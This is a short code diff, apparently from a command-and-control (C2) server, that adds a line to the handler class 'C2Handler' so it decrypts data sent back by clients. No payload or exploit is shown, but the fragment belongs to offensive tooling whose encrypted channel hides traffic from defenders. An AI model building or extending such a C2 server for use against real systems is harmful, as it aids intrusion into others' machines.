@@ -108,6 +108,7 @@ class C2Handler(BaseHTTPRequestHandler):
         client_data = client_data.decode()
         client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
         client_data = unquote_plus(client_data)
+        client_data = cipher.decrypt(client_data.encode()).decode() # decoder 
         return client_data
 
     def http_response(self, code: int):
